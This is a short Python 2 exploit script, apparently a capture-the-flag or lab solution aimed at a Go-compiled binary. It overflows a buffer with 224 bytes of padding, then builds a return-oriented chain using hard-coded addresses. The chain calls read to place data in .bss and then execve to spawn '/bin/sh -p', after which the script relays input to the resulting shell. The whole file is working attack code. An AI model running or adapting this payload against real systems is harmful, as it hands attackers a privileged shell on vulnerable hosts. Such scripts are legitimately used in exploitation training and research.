#!/usr/local/pyhon

import struct
import time
import sys

if len(sys.argv) == 2 and sys.argv[1] == "printonly":
	time.sleep(0.5)

addr_bss = 0x564200 + 0x100

shellcode = "\0" * 224
shellcode += struct.pack("<Q", 0x481E40) # Return Pointer(1) -> syscall.Syscall
shellcode += struct.pack("<Q", 0x0040197f) # Return Pointer(2) -> (add rsp, 0x38 ; ret)
shellcode += struct.pack("<Q", 0) # Arg1 of Syscall: 0 (read)
shellcode += struct.pack("<Q", 0) # Arg2 of Syscall: 0 (stdin)
shellcode += struct.pack("<Q", addr_bss) # Arg3 of Syscall: .bss
shellcode += struct.pack("<Q", 0x100) # Arg4 of Syscall
shellcode += struct.pack("<Q", 0) # dummy
shellcode += struct.pack("<Q", 0) # dummy
shellcode += struct.pack("<Q", 0) # dummy
shellcode += struct.pack("<Q", 0x481E40) # Return Pointer(3) -> syscall.Syscall
shellcode += struct.pack("<Q", 0) # Return Pointer(4) -> dummy
shellcode += struct.pack("<Q", 59) # Arg1 of Syscall: (execve)
shellcode += struct.pack("<Q", addr_bss) # Arg2 of Syscall:
shellcode += struct.pack("<Q", addr_bss + 0x10) # Arg3 of Syscall:
shellcode += struct.pack("<Q", 0) # Arg4 of Syscall

print(shellcode)
sys.stdout.flush()

time.sleep(1)

shellstr = "/bin/sh\0"
shellstr += "-p\0\0\0\0\0\0"
shellstr += struct.pack("<Q", addr_bss) # Arg3 of Syscall: .bss
shellstr += struct.pack("<Q", addr_bss + 0x08) # Arg3 of Syscall: .bss
shellstr += struct.pack("<Q", 0) # Arg3 of Syscall: .bss
print(shellstr)
sys.stdout.flush()

if len(sys.argv) == 2 and sys.argv[1] == "printonly":
	sys.exit()

while True:
	print(sys.stdin.readline().rstrip("\n"))
	sys.stdout.flush()

